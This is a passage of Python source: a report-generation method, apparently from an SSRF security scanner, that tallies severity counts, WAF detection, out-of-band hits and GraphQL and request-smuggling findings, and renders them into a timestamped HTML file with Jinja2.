    def generate_report(self, 
                       target: str,
                       scan_start: datetime,
                       scan_end: datetime,
                       all_evidence: List,
                       waf_info: Dict,
                       graphql_findings: List,
                       smuggling_findings: List,
                       deduplicated_findings: Dict) -> str:
        """Generate HTML report"""
        
        if not JINJA2_AVAILABLE:
            print(f"{WARN} Jinja2 not installed. Install with: pip install jinja2")
            return None
        
        # Calculate statistics
        severity_counts = Counter()
        for f in all_evidence:
            severity_counts[f.severity] += 1
        
        duration = str(scan_end - scan_start).split('.')[0]
        
        template = Template(self.TEMPLATE)
        html = template.render(
            target=target,
            scan_date=scan_start.strftime("%Y-%m-%d %H:%M:%S UTC"),
            duration=duration,
            waf_detected=waf_info.get("detected", False),
            waf_name=waf_info.get("primary", "Unknown"),
            waf_confidence=waf_info.get("confidence", 0),
            total_findings=len(all_evidence),
            total_endpoints=len(deduplicated_findings),
            vulnerable_count=sum(1 for v in deduplicated_findings.values() if v["oob_count"] > 0),
            critical_count=severity_counts.get("critical", 0),
            severity_data=[
                severity_counts.get("critical", 0),
                severity_counts.get("high", 0),
                severity_counts.get("medium", 0),
                severity_counts.get("low", 0),
                severity_counts.get("info", 0)
            ],
            findings=[{
                "endpoint": ep,
                "param": param,
                "severity": info["max_severity"],
                "oob_count": info["oob_count"],
                "sensitive": info["sensitive"],
                "top_pattern": info["findings"][0].matched_patterns[0] if info["findings"][0].matched_patterns else "N/A"
            } for (ep, param), info in deduplicated_findings.items()],
            graphql_findings=graphql_findings[:10],
            smuggling_findings=smuggling_findings[:10]
        )
        
        # Save report
        report_file = f"ssrf_report_{target}_{scan_start.strftime('%Y%m%d_%H%M%S')}.html"
        with open(report_file, "w", encoding="utf-8") as f:
            f.write(html)
        
        return report_file


